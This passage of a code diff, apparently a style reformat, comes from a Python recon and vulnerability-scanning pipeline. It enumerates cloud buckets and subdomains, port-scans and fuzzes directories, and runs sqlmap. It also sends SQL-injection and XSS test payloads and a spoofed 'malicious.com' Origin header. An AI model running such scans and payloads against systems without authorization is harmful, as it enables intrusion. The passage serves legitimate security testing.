                     azure_url = f"https://{bucket}.blob.core.windows.net/"
-                    result = run_cmd(["curl", "-s", "-I", "--max-time", "10", azure_url],
-                                   capture=True, timeout=15, check_return=False)
+                    result = run_cmd(
+                        ["curl", "-s", "-I", "--max-time", "10", azure_url],
+                        capture=True,
+                        timeout=15,
+                        check_return=False,
+                    )
 
-                    if result.stdout and ("200" in result.stdout or "400" in result.stdout):
+                    if result.stdout and (
+                        "200" in result.stdout or "400" in result.stdout
+                    ):
                         results[f"azure_{bucket}"] = {
                             "type": "Azure Blob",
                             "url": azure_url,
-                            "status": "accessible" if "200" in result.stdout else "exists",
-                            "headers": result.stdout.strip()
+                            "status": (
+                                "accessible" if "200" in result.stdout else "exists"
+                            ),
+                            "headers": result.stdout.strip(),
                         }
             except Exception:
                 continue
@@ -4781,15 +6163,25 @@ def run_cloud_storage_scanning(target: str, out_file: Path, env: Dict[str, str])
             try:
                 if which("curl"):
                     gcs_url = f"https://storage.googleapis.com/{bucket}/"
-                    result = run_cmd(["curl", "-s", "-I", "--max-time", "10", gcs_url],
-                                   capture=True, timeout=15, check_return=False)
+                    result = run_cmd(
+                        ["curl", "-s", "-I", "--max-time", "10", gcs_url],
+                        capture=True,
+                        timeout=15,
+                        check_return=False,
+                    )
 
-                    if result.stdout and ("200" in result.stdout or "403" in result.stdout):
+                    if result.stdout and (
+                        "200" in result.stdout or "403" in result.stdout
+                    ):
                         results[f"gcs_{bucket}"] = {
                             "type": "Google Cloud Storage",
                             "url": gcs_url,
-                            "status": "accessible" if "200" in result.stdout else "exists_but_protected",
-                            "headers": result.stdout.strip()
+                            "status": (
+                                "accessible"
+                                if "200" in result.stdout
+                                else "exists_but_protected"
+                            ),
+                            "headers": result.stdout.strip(),
                         }
             except Exception:
                 continue
@@ -4800,7 +6192,10 @@ def run_cloud_storage_scanning(target: str, out_file: Path, env: Dict[str, str])
     except Exception as e:
         logger.log(f"Cloud storage scanning error: {e}", "ERROR")
 
-def run_threat_intelligence_lookup(target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]):
+
+def run_threat_intelligence_lookup(
+    target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]
+):
     """Perform threat intelligence lookups using various sources"""
     try:
         logger.log(f"Threat intelligence lookup for {target}", "INFO")
@@ -4808,7 +6203,8 @@ def run_threat_intelligence_lookup(target: str, out_file: Path, cfg: Dict[str, A
 
         # Extract domain/IP
         from urllib.parse import urlparse
-        parsed = urlparse(target if target.startswith('http') else f"http://{target}")
+
+        parsed = urlparse(target if target.startswith("http") else f"http://{target}")
         domain = parsed.netloc or target
 
         # Shodan lookup (if API key provided)
@@ -4816,8 +6212,12 @@ def run_threat_intelligence_lookup(target: str, out_file: Path, cfg: Dict[str, A
         if shodan_api and which("curl"):
             try:
                 shodan_url = f"https://api.shodan.io/host/{domain}?key={shodan_api}"
-                result = run_cmd(["curl", "-s", "--max-time", "15", shodan_url],
-                               capture=True, timeout=20, check_return=False)
+                result = run_cmd(
+                    ["curl", "-s", "--max-time", "15", shodan_url],
+                    capture=True,
+                    timeout=20,
+                    check_return=False,
+                )
 
                 if result.stdout and "error" not in result.stdout.lower():
                     results["shodan"] = json.loads(result.stdout)
@@ -4829,12 +6229,22 @@ def run_threat_intelligence_lookup(target: str, out_file: Path, cfg: Dict[str, A
         if vt_api and which("curl"):
             try:
                 vt_url = "https://www.virustotal.com/vtapi/v2/domain/report"
-                result = run_cmd([
-                    "curl", "-s", "--max-time", "15",
-                    "-d", f"apikey={vt_api}",
-                    "-d", f"domain={domain}",
-                    vt_url
-                ], capture=True, timeout=20, check_return=False)
+                result = run_cmd(
+                    [
+                        "curl",
+                        "-s",
+                        "--max-time",
+                        "15",
+                        "-d",
+                        f"apikey={vt_api}",
+                        "-d",
+                        f"domain={domain}",
+                        vt_url,
+                    ],
+                    capture=True,
+                    timeout=20,
+                    check_return=False,
+                )
 
                 if result.stdout:
                     try:
@@ -4851,12 +6261,16 @@ def run_threat_intelligence_lookup(target: str, out_file: Path, cfg: Dict[str, A
         try:
             if which("dig"):
                 # Check if domain is in abuse.ch feeds
-                abuse_result = run_cmd(["dig", "+short", f"{domain}.abuse.ch"],
-                                     capture=True, timeout=10, check_return=False)
+                abuse_result = run_cmd(
+                    ["dig", "+short", f"{domain}.abuse.ch"],
+                    capture=True,
+                    timeout=10,
+                    check_return=False,
+                )
                 if abuse_result.stdout and abuse_result.stdout.strip():
                     results["abuse_ch"] = {
                         "listed": True,
-                        "response": abuse_result.stdout.strip()
+                        "response": abuse_result.stdout.strip(),
                     }
         except Exception as e:
             logging.warning(f"Operation failed: {e}")
@@ -4867,7 +6281,10 @@ def run_threat_intelligence_lookup(target: str, out_file: Path, cfg: Dict[str, A
     except Exception as e:
         logger.log(f"Threat intelligence lookup error: {e}", "ERROR")
 
-def run_compliance_checks(target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]):
+
+def run_compliance_checks(
+    target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]
+):
     """Run compliance-specific security checks"""
     try:
         logger.log(f"Compliance checks for {target}", "INFO")
@@ -4886,7 +6303,7 @@ def run_compliance_checks(target: str, out_file: Path, cfg: Dict[str, Any], env:
                 "xss": [],
                 "insecure_deserialization": [],
                 "vulnerable_components": [],
-                "logging_monitoring": []
+                "logging_monitoring": [],
             }
 
             # Basic OWASP Top 10 checks
@@ -4896,28 +6313,43 @@ def run_compliance_checks(target: str, out_file: Path, cfg: Dict[str, Any], env:
                 for payload in sql_payloads:
                     try:
                         test_url = f"{target}?id={payload}"
-                        result = run_cmd(["curl", "-s", "--max-time", "10", test_url],
-                                       capture=True, timeout=15, check_return=False)
-                        if result.stdout and ("error" in result.stdout.lower() or "sql" in result.stdout.lower()):
-                            results["owasp_top10"]["injection"].append({
-                                "payload": payload,
-                                "response_indicates_vulnerability": True
-                            })
+                        result = run_cmd(
+                            ["curl", "-s", "--max-time", "10", test_url],
+                            capture=True,
+                            timeout=15,
+                            check_return=False,
+                        )
+                        if result.stdout and (
+                            "error" in result.stdout.lower()
+                            or "sql" in result.stdout.lower()
+                        ):
+                            results["owasp_top10"]["injection"].append(
+                                {
+                                    "payload": payload,
+                                    "response_indicates_vulnerability": True,
+                                }
+                            )
                     except Exception:
                         continue
 
                 # XSS basic test
-                xss_payloads = ["<script>alert('xss')</script>", "javascript:alert('xss')"]
+                xss_payloads = [
+                    "<script>alert('xss')</script>",
+                    "javascript:alert('xss')",
+                ]
                 for payload in xss_payloads:
                     try:
                         test_url = f"{target}?search={payload}"
-                        result = run_cmd(["curl", "-s", "--max-time", "10", test_url],
-                                       capture=True, timeout=15, check_return=False)
+                        result = run_cmd(
+                            ["curl", "-s", "--max-time", "10", test_url],
+                            capture=True,
+                            timeout=15,
+                            check_return=False,
+                        )
                         if result.stdout and payload in result.stdout:
-                            results["owasp_top10"]["xss"].append({
-                                "payload": payload,
-                                "reflected": True
-                            })
+                            results["owasp_top10"]["xss"].append(
+                                {"payload": payload, "reflected": True}
+                            )
                     except Exception:
                         continue
 
@@ -4925,31 +6357,48 @@ def run_compliance_checks(target: str, out_file: Path, cfg: Dict[str, Any], env:
             results["pci_dss"] = {
                 "ssl_tls_version": {},
                 "secure_protocols": {},
-                "encryption_strength": {}
+                "encryption_strength": {},
             }
 
             # Check SSL/TLS configuration for PCI DSS compliance
             if which("openssl"):
                 try:
                     from urllib.parse import urlparse
-                    parsed = urlparse(target if target.startswith('http') else f"https://{target}")
+
+                    parsed = urlparse(
+                        target if target.startswith("http") else f"https://{target}"
+                    )
                     host = parsed.netloc or target
                     port = parsed.port or 443
 
                     # Test TLS versions
                     tls_versions = ["ssl3", "tls1", "tls1_1", "tls1_2", "tls1_3"]
                     for version in tls_versions:
-                        result = run_cmd([
-                            "openssl", "s_client", f"-{version}",
-                            "-connect", f"{host}:{port}",
-                            "-servername", host
-                        ], input_data="", capture=True, timeout=10, check_return=False)
+                        result = run_cmd(
+                            [
+                                "openssl",
+                                "s_client",
+                                f"-{version}",
+                                "-connect",
+                                f"{host}:{port}",
+                                "-servername",
+                                host,
+                            ],
+                            input_data="",
+                            capture=True,
+                            timeout=10,
+                            check_return=False,
+                        )
 
                         if result.stdout:
                             if "Verify return code: 0" in result.stdout:
-                                results["pci_dss"]["ssl_tls_version"][version] = "supported"
+                                results["pci_dss"]["ssl_tls_version"][
+                                    version
+                                ] = "supported"
                             else:
-                                results["pci_dss"]["ssl_tls_version"][version] = "not_supported"
+                                results["pci_dss"]["ssl_tls_version"][
+                                    version
+                                ] = "not_supported"
                 except Exception as e:
                     logging.warning(f"Operation failed: {e}")
                     # Consider if this error should be handled differently
@@ -4959,7 +6408,10 @@ def run_compliance_checks(target: str, out_file: Path, cfg: Dict[str, Any], env:
     except Exception as e:
         logger.log(f"Compliance checks error: {e}", "ERROR")
 
-def run_ml_vulnerability_analysis(scan_results_dir: Path, out_file: Path, cfg: Dict[str, Any]):
+
+def run_ml_vulnerability_analysis(
+    scan_results_dir: Path, out_file: Path, cfg: Dict[str, Any]
+):
     """Apply machine learning-based analysis to scan results"""
     try:
         logger.log("ML-based vulnerability analysis starting", "INFO")
@@ -4967,7 +6419,7 @@ def run_ml_vulnerability_analysis(scan_results_dir: Path, out_file: Path, cfg: D
             "false_positive_reduction": {},
             "risk_scoring": {},
             "pattern_analysis": {},
-            "prioritization": []
+            "prioritization": [],
         }
 
         ml_cfg = cfg.get("ml_analysis", {})
@@ -4977,7 +6429,7 @@ def run_ml_vulnerability_analysis(scan_results_dir: Path, out_file: Path, cfg: D
             nuclei_results = []
             for nuclei_file in scan_results_dir.glob("**/nuclei_results.jsonl"):
                 try:
-                    with open(nuclei_file, 'r') as f:
+                    with open(nuclei_file, "r") as f:
                         for line in f:
                             if line.strip():
                                 nuclei_results.append(json.loads(line))
@@ -5012,7 +6464,11 @@ def run_ml_vulnerability_analysis(scan_results_dir: Path, out_file: Path, cfg: D
             results["false_positive_reduction"] = {
                 "original_count": len(nuclei_results),
                 "filtered_count": len(filtered_results),
-                "reduction_percentage": ((len(nuclei_results) - len(filtered_results)) / max(len(nuclei_results), 1)) * 100
+                "reduction_percentage": (
+                    (len(nuclei_results) - len(filtered_results))
+                    / max(len(nuclei_results), 1)
+                )
+                * 100,
             }
 
         if ml_cfg.get("risk_scoring_ml", True):
@@ -5020,7 +6476,13 @@ def run_ml_vulnerability_analysis(scan_results_dir: Path, out_file: Path, cfg: D
             risk_factors = {}
 
             # Count vulnerabilities by severity
-            severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
+            severity_counts = {
+                "critical": 0,
+                "high": 0,
+                "medium": 0,
+                "low": 0,
+                "info": 0,
+            }
             for result in nuclei_results:
                 severity = result.get("info", {}).get("severity", "info").lower()
                 if severity in severity_counts:
@@ -5028,12 +6490,22 @@ def run_ml_vulnerability_analysis(scan_results_dir: Path, out_file: Path, cfg: D
 
             # Calculate weighted risk score
             weights = {"critical": 10, "high": 7, "medium": 4, "low": 2, "info": 0.5}
-            total_score = sum(severity_counts[sev] * weights[sev] for sev in severity_counts)
+            total_score = sum(
+                severity_counts[sev] * weights[sev] for sev in severity_counts
+            )
 
             results["risk_scoring"] = {
                 "total_risk_score": total_score,
                 "severity_distribution": severity_counts,
-                "risk_level": "critical" if total_score > 50 else "high" if total_score > 20 else "medium" if total_score > 5 else "low"
+                "risk_level": (
+                    "critical"
+                    if total_score > 50
+                    else (
+                        "high"
+                        if total_score > 20
+                        else "medium" if total_score > 5 else "low"
+                    )
+                ),
             }
 
         atomic_write(out_file, json.dumps(results, indent=2))
@@ -5041,6 +6513,7 @@ def run_ml_vulnerability_analysis(scan_results_dir: Path, out_file: Path, cfg: D
 
     except Exception as e:
         logger.log(f"ML vulnerability analysis error: {e}", "ERROR")
+
 
 # ---------- Core stages ----------
 @monitor_performance("recon_stage")
@@ -5066,7 +6539,7 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
             "ssl_info": {},
             "network_info": {},
             "directories": [],
-            "endpoints": []
+            "endpoints": [],
         }
 
         try:
@@ -5088,7 +6561,9 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
             subs = set()
             for p in [subfinder_out, amass_out]:
                 if p.exists():
-                    for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
+                    for line in p.read_text(
+                        encoding="utf-8", errors="ignore"
+                    ).splitlines():
                         s = line.strip()
                         if s and not s.startswith("#"):
                             subs.add(s)
@@ -5126,25 +6601,43 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
 
             # Parse naabu output
             if ports_out.exists():
-                for line in ports_out.read_text(encoding="utf-8", errors="ignore").splitlines():
+                for line in ports_out.read_text(
+                    encoding="utf-8", errors="ignore"
+                ).splitlines():
                     l = line.strip()
                     if l and ":" in l:
                         try:
                             h, port = l.rsplit(":", 1)
-                            oports.append({"host": h, "port": int(port), "proto": "tcp", "source": "naabu"})
+                            oports.append(
+                                {
+                                    "host": h,
+                                    "port": int(port),
+                                    "proto": "tcp",
+                                    "source": "naabu",
+                                }
+                            )
                         except Exception as e:
                             logging.warning(f"Operation failed: {e}")
             # Consider if this error should be handled differently
             # Parse masscan output
             if masscan_out.exists():
-                for line in masscan_out.read_text(encoding="utf-8", errors="ignore").splitlines():
+                for line in masscan_out.read_text(
+                    encoding="utf-8", errors="ignore"
+                ).splitlines():
                     if "open" in line and "tcp" in line:
                         try:
                             parts = line.split()
                             for part in parts:
                                 if "/" in part and part.split("/")[1] == "tcp":
                                     port = int(part.split("/")[0])
-                                    oports.append({"host": host, "port": port, "proto": "tcp", "source": "masscan"})
+                                    oports.append(
+                                        {
+                                            "host": host,
+                                            "port": port,
+                                            "proto": "tcp",
+                                            "source": "masscan",
+                                        }
+                                    )
                                     break
                         except Exception as e:
                             logging.warning(f"Operation failed: {e}")
@@ -5157,7 +6650,9 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                     unique_ports[key] = port_info
 
             results["open_ports"] = list(unique_ports.values())
-            logger.log(f"{target}: {len(results['open_ports'])} unique open ports", "INFO")
+            logger.log(
+                f"{target}: {len(results['open_ports'])} unique open ports", "INFO"
+            )
 
             # Phase 4: HTTP Service Discovery
             logger.log(f"Phase 4: HTTP service discovery for {target}", "INFO")
@@ -5169,20 +6664,26 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                 run_httpx(httpx_in, httpx_out, env, cfg["limits"]["http_timeout"])
                 if httpx_out.exists():
                     http_info: List[Dict[str, Any]] = []
-                    for line in httpx_out.read_text(encoding="utf-8", errors="ignore").splitlines():
+                    for line in httpx_out.read_text(
+                        encoding="utf-8", errors="ignore"
+                    ).splitlines():
                         try:
                             data = json.loads(line)
                             http_info.append(data)
                         except Exception as e:
                             logging.warning(f"Operation failed: {e}")
-            # Consider if this error should be handled differently
+                    # Consider if this error should be handled differently
                     results["http_info"] = http_info
 
             # Phase 5: Technology Detection
             if cfg["advanced_scanning"]["technology_detection"]:
                 logger.log(f"Phase 5: Technology detection for {target}", "INFO")
                 whatweb_out = tdir / "whatweb.json"
-                run_whatweb(target if target.startswith("http") else f"http://{target}", whatweb_out, env)
+                run_whatweb(
+                    target if target.startswith("http") else f"http://{target}",
+                    whatweb_out,
+                    env,
+                )
                 if whatweb_out.exists():
                     try:
                         tech_data = json.loads(whatweb_out.read_text())
@@ -5194,7 +6695,11 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
             if cfg["advanced_scanning"]["ssl_analysis"]:
                 logger.log(f"Phase 6: SSL analysis for {target}", "INFO")
                 ssl_out = tdir / "ssl_analysis.json"
-                run_ssl_analysis(target if target.startswith("https") else f"https://{target}", ssl_out, env)
+                run_ssl_analysis(
+                    target if target.startswith("https") else f"https://{target}",
+                    ssl_out,
+                    env,
+                )
                 if ssl_out.exists():
                     try:
                         results["ssl_info"] = json.loads(ssl_out.read_text())
@@ -5213,11 +6718,15 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                             network_info[file.stem] = file.read_text()
                         except Exception as e:
                             logging.warning(f"Operation failed: {e}")
-            # Consider if this error should be handled differently
+                    # Consider if this error should be handled differently
                     results["network_info"] = network_info
 
             # Phase 8: Directory/File Fuzzing
-            if cfg["fuzzing"]["enable_gobuster"] or cfg["fuzzing"]["enable_dirb"] or cfg["fuzzing"]["enable_ffu"]:
+            if (
+                cfg["fuzzing"]["enable_gobuster"]
+                or cfg["fuzzing"]["enable_dirb"]
+                or cfg["fuzzing"]["enable_ffu"]
+            ):
                 logger.log(f"Phase 8: Directory fuzzing for {target}", "INFO")
                 target_url = target if target.startswith("http") else f"http://{target}"
 
@@ -5225,19 +6734,48 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                 wordlist_path = MERGED_DIR / "all_merged_wordlist.txt"
                 if not wordlist_path.exists():
                     # Fallback to smaller wordlist
-                    small_wordlist = "\n".join([
-                        "admin", "login", "test", "backup", "config", "database", "db",
-                        "panel", "api", "v1", "v2", "upload", "uploads", "files", "images",
-                        "scripts", "css", "js", "assets", "static", "public", "private"
-                    ])
+                    small_wordlist = "\n".join(
+                        [
+                            "admin",
+                            "login",
+                            "test",
+                            "backup",
+                            "config",
+                            "database",
+                            "db",
+                            "panel",
+                            "api",
+                            "v1",
+                            "v2",
+                            "upload",
+                            "uploads",
+                            "files",
+                            "images",
+                            "scripts",
+                            "css",
+                            "js",
+                            "assets",
+                            "static",
+                            "public",
+                            "private",
+                        ]
+                    )
                     atomic_write(wordlist_path, small_wordlist)
 
                 if cfg["fuzzing"]["enable_gobuster"]:
                     gobuster_out = tdir / "gobuster_dirs.txt"
-                    run_gobuster(target_url, wordlist_path, gobuster_out, cfg["fuzzing"]["extensions"], env)
+                    run_gobuster(
+                        target_url,
+                        wordlist_path,
+                        gobuster_out,
+                        cfg["fuzzing"]["extensions"],
+                        env,
+                    )
                     if gobuster_out.exists():
                         dirs = []
-                        for line in gobuster_out.read_text(encoding="utf-8", errors="ignore").splitlines():
+                        for line in gobuster_out.read_text(
+                            encoding="utf-8", errors="ignore"
+                        ).splitlines():
                             if line.strip() and not line.startswith("="):
                                 dirs.append(line.strip())
                         results["directories"].extend(dirs)
@@ -5250,7 +6788,9 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                             ffuf_data = json.loads(ffuf_out.read_text())
                             if "results" in ffuf_data:
                                 for result in ffuf_data["results"]:
-                                    results["directories"].append(f"{result.get('url', '')} (Status: {result.get('status', 'N/A')})")
+                                    results["directories"].append(
+                                        f"{result.get('url', '')} (Status: {result.get('status', 'N/A')})"
+                                    )
                         except Exception as e:
                             logging.warning(f"Operation failed: {e}")
             # Consider if this error should be handled differently
@@ -5263,11 +6803,18 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                     run_waybackurls(host, wayback_out, env)
                     if wayback_out.exists():
                         endpoints = read_lines(wayback_out)
-                        results["endpoints"].extend(endpoints[:cfg["endpoints"]["max_urls_per_target"]])
+                        results["endpoints"].extend(
+                            endpoints[: cfg["endpoints"]["max_urls_per_target"]]
+                        )
 
                 if cfg["endpoints"]["use_gospider"]:
                     gospider_out = tdir / "gospider"
-                    run_gospider(target_url, gospider_out, cfg["endpoints"].get("gospider_depth", 3), env)
+                    run_gospider(
+                        target_url,
+                        gospider_out,
+                        cfg["endpoints"].get("gospider_depth", 3),
+                        env,
+                    )
 
             # Phase 10: Subdomain Takeover Check
             if cfg["advanced_scanning"]["subdomain_takeover"] and subs:
@@ -5278,19 +6825,37 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
             results["status"] = "completed"
             logger.log(f"Recon completed for {target}", "SUCCESS")
             # Phase 7: Subdomain Takeover Detection
-            if cfg.get("subdomain_takeover", {}).get("enabled", True) and results["subdomains"]:
+            if (
+                cfg.get("subdomain_takeover", {}).get("enabled", True)
+                and results["subdomains"]
+            ):
                 logger.log(f"Phase 7: Subdomain takeover detection for {host}", "INFO")
 
                 # Create subdomain file for takeover tools
                 subs_file = tdir / "subdomains.txt"
 
                 # Run subjack
-                if cfg.get("subdomain_takeover", {}).get("subjack", True) and which("subjack"):
+                if cfg.get("subdomain_takeover", {}).get("subjack", True) and which(
+                    "subjack"
+                ):
                     subjack_out = tdir / "subjack_results.txt"
-                    run_cmd([
-                        "subjack", "-w", str(subs_file), "-t", "100", "-timeout", "30",
-                        "-o", str(subjack_out), "-ssl"
-                    ], env=env, timeout=600, check_return=False)
+                    run_cmd(
+                        [
+                            "subjack",
+                            "-w",
+                            str(subs_file),
+                            "-t",
+                            "100",
+                            "-timeout",
+                            "30",
+                            "-o",
+                            str(subjack_out),
+                            "-ssl",
+                        ],
+                        env=env,
+                        timeout=600,
+                        check_return=False,
+                    )
 
                 # Run subzy
                 if cfg.get("subdomain_takeover", {}).get("subzy", True):
@@ -5307,9 +6872,12 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
         futs = {ex.submit(per_target, t): t for t in targets}
         for fut in as_completed(futs):
             res = fut.result()
-            logger.log(f"Recon complete: {res.get('target')} -> {res.get('status')}", "INFO")
+            logger.log(
+                f"Recon complete: {res.get('target')} -> {res.get('status')}", "INFO"
+            )
 
     logger.log("Enhanced recon stage complete", "SUCCESS")
+
 
 @monitor_performance("vuln_scan_stage")
 def stage_vuln_scan(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
@@ -5423,7 +6991,9 @@ def stage_vuln_scan(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                     run_ffuf(target_url, wordlist, ffuf_out, env)
 
             if cfg.get("fuzzing", {}).get("enable_feroxbuster", True):
-                logger.log(f"Phase 15b: Feroxbuster directory fuzzing for {target}", "INFO")
+                logger.log(
+                    f"Phase 15b: Feroxbuster directory fuzzing for {target}", "INFO"
+                )
                 wordlist = get_best_wordlist("directories")
                 if wordlist:
                     ferox_out = tdir / "feroxbuster_results.json"
@@ -5434,7 +7004,9 @@ def stage_vuln_scan(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                 run_sqlmap(target_url, sqlmap_out, env)
 
             # Phase 13: Additional vulnerability checks from recon data
-            logger.log(f"Phase 13: Additional vulnerability checks for {target}", "INFO")
+            logger.log(
+                f"Phase 13: Additional vulnerability checks for {target}", "INFO"
+            )
             additional_out = tdir / "additional_vulns.json"
             perform_additional_checks(target, tdir, additional_out, cfg, env)
 
@@ -5456,6 +7028,7 @@ def stage_vuln_scan(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
 
     logger.log("Enhanced vulnerability scan stage complete", "SUCCESS")
 
+
 def check_security_headers(target: str, out_file: Path, env: Dict[str, str]):
     """Check for important security headers"""
     security_headers = {
@@ -5465,44 +7038,51 @@ def check_security_headers(target: str, out_file: Path, env: Dict[str, str]):
         "X-Content-Type-Options": "MIME Sniffing Protection",
         "X-XSS-Protection": "XSS Protection",
         "Referrer-Policy": "Referrer Policy",
-        "Permissions-Policy": "Permissions Policy"
+        "Permissions-Policy": "Permissions Policy",
     }
 
     results = {
         "target": target,
         "headers_present": {},
         "headers_missing": [],
-        "security_score": 0
+        "security_score": 0,
     }
 
     try:
         if which("curl"):
-            result = run_cmd(["curl", "-I", "-s", "-k", target], capture=True, timeout=30, check_return=False)
+            result = run_cmd(
+                ["curl", "-I", "-s", "-k", target],
+                capture=True,
+                timeout=30,
+                check_return=False,
+            )
             if result.stdout:
                 headers = {}
-                for line in result.stdout.split('\n'):
-                    if ':' in line:
-                        key, value = line.split(':', 1)
+                for line in result.stdout.split("\n"):
+                    if ":" in line:
+                        key, value = line.split(":", 1)
                         headers[key.strip()] = value.strip()
 
                 for header, description in security_headers.items():
                     if header in headers:
                         results["headers_present"][header] = {
                             "value": headers[header],
-                            "description": description
+                            "description": description,
                         }
                         results["security_score"] += 1
                     else:
-                        results["headers_missing"].append({
-                            "header": header,
-                            "description": description
-                        })
+                        results["headers_missing"].append(
+                            {"header": header, "description": description}
+                        )
 
-                results["security_score"] = (results["security_score"] / len(security_headers)) * 100
+                results["security_score"] = (
+                    results["security_score"] / len(security_headers)
+                ) * 100
 
         atomic_write(out_file, json.dumps(results, indent=2))
     except Exception as e:
         logger.log(f"Security headers check error: {e}", "WARNING")
+
 
 def check_cors_configuration(target: str, out_file: Path, env: Dict[str, str]):
     """Check CORS configuration for potential issues"""
@@ -5512,21 +7092,32 @@ def check_cors_configuration(target: str, out_file: Path, env: Dict[str, str]):
         "wildcard_origin": False,
         "credentials_allowed": False,
         "unsafe_headers": [],
-        "risk_level": "low"
+        "risk_level": "low",
     }
 
     try:
         if which("curl"):
             # Test with a malicious origin
-            result = run_cmd([
-                "curl", "-I", "-s", "-k", "-H", "Origin: https://malicious.com", target
-            ], capture=True, timeout=30, check_return=False)
+            result = run_cmd(
+                [
+                    "curl",
+                    "-I",
+                    "-s",
+                    "-k",
+                    "-H",
+                    "Origin: https://malicious.com",
+                    target,
+                ],
+                capture=True,
+                timeout=30,
+                check_return=False,
+            )
 
             if result.stdout:
                 headers = {}
-                for line in result.stdout.split('\n'):
-                    if ':' in line:
-                        key, value = line.split(':', 1)
+                for line in result.stdout.split("\n"):
+                    if ":" in line:
+                        key, value = line.split(":", 1)
                         headers[key.strip().lower()] = value.strip()
 
                 if "access-control-allow-origin" in headers:
@@ -5546,7 +7137,10 @@ def check_cors_configuration(target: str, out_file: Path, env: Dict[str, str]):
                         if cors_results["wildcard_origin"]:
                             cors_results["risk_level"] = "critical"
 
-                dangerous_headers = ["access-control-allow-headers", "access-control-allow-methods"]
+                dangerous_headers = [
+                    "access-control-allow-headers",
+                    "access-control-allow-methods",
+                ]
                 for header in dangerous_headers:
                     if header in headers and "*" in headers[header]:
                         cors_results["unsafe_headers"].append(header)
@@ -5556,12 +7150,22 @@ def check_cors_configuration(target: str, out_file: Path, env: Dict[str, str]):
     except Exception as e:
         logger.log(f"CORS analysis error: {e}", "WARNING")
 
+
 def _check_admin_panels(target: str) -> List[str]:
     """Check for exposed admin panels"""
     admin_paths = [
-        "/admin", "/administrator", "/admin.php", "/admin/login.php",
-        "/wp-admin", "/administrator/", "/admin/index.php", "/admin/admin.php",
-        "/login", "/login.php", "/signin", "/signin.php"
+        "/admin",
+        "/administrator",
+        "/admin.php",
+        "/admin/login.php",
+        "/wp-admin",
+        "/administrator/",
+        "/admin/index.php",
+        "/admin/admin.php",
+        "/login",
+        "/login.php",
+        "/signin",
+        "/signin.php",
     ]
 
     found_panels = []
@@ -5569,12 +7173,13 @@ def _check_admin_panels(target: str) -> List[str]:
         return found_panels
 
     for path in admin_paths:
-        full_url = target.rstrip('/') + path
+        full_url = target.rstrip("/") + path
         response = safe_http_request(full_url, timeout=10)
         if response and ("200 OK" in response or "302 Found" in response):
             found_panels.append(path)
 
     return found_panels
+
 
 def _check_backup_files(target: str) -> List[str]:
     """Check for exposed backup files"""
@@ -5594,6 +7199,7 @@ def _check_backup_files(target: str) -> List[str]:
 
     return found_backups
 
+
 def _check_robots_txt(target: str) -> List[str]:
     """Analyze robots.txt for sensitive information"""
     disallowed = []
@@ -5604,21 +7210,28 @@ def _check_robots_txt(target: str) -> List[str]:
     response = safe_http_request(robots_url, timeout=10)
 
     if response and "disallow" in response.lower():
-        for line in response.split('\n'):
-            if line.lower().startswith('disallow:'):
-                path = line.split(':', 1)[1].strip()
-                if path and path != '/':
+        for line in response.split("\n"):
+            if line.lower().startswith("disallow:"):
+                path = line.split(":", 1)[1].strip()
+                if path and path != "/":
                     disallowed.append(path)
 
     return disallowed[:10]  # Limit to first 10
 
-def perform_additional_checks(target: str, target_dir: Path, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]):
+
+def perform_additional_checks(
+    target: str,
+    target_dir: Path,
+    out_file: Path,
+    cfg: Dict[str, Any],
+    env: Dict[str, str],
+):
     """Perform additional vulnerability checks based on discovered services"""
     additional_vulns = {
         "target": target,
         "checks_performed": [],
         "vulnerabilities": [],
-        "recommendations": []
+        "recommendations": [],
     }
 
     def _perform_checks():
@@ -5626,51 +7239,56 @@ def perform_additional_checks(target: str, target_dir: Path, out_file: Path, cfg
         additional_vulns["checks_performed"].append("Admin panel discovery")
         found_panels = _check_admin_panels(target)
         if found_panels:
-            additional_vulns["vulnerabilities"].append({
-                "type": "Exposed Admin Panels",
-                "severity": "medium",
-                "description": f"Found {len(found_panels)} potential admin panels",
-                "details": found_panels
-            })
+            additional_vulns["vulnerabilities"].append(
+                {
+                    "type": "Exposed Admin Panels",
+                    "severity": "medium",
+                    "description": f"Found {len(found_panels)} potential admin panels",
+                    "details": found_panels,
+                }
+            )
 
         # Check for common backup files
         additional_vulns["checks_performed"].append("Backup file discovery")
         found_backups = _check_backup_files(target)
         if found_backups:
-            additional_vulns["vulnerabilities"].append({
-                "type": "Exposed Backup Files",
-                "severity": "high",
-                "description": f"Found {len(found_backups)} potential backup files",
-                "details": found_backups
-            })
+            additional_vulns["vulnerabilities"].append(
+                {
+                    "type": "Exposed Backup Files",
+                    "severity": "high",
+                    "description": f"Found {len(found_backups)} potential backup files",
+                    "details": found_backups,
+                }
+            )
 
         # Check robots.txt for sensitive information
         additional_vulns["checks_performed"].append("Robots.txt analysis")
         disallowed_paths = _check_robots_txt(target)
         if disallowed_paths:
-            additional_vulns["vulnerabilities"].append({
-                "type": "Robots.txt Information Disclosure",
-                "severity": "low",
-                "description": "Robots.txt reveals potentially sensitive paths",
-                "details": disallowed_paths
-            })
+            additional_vulns["vulnerabilities"].append(
+                {
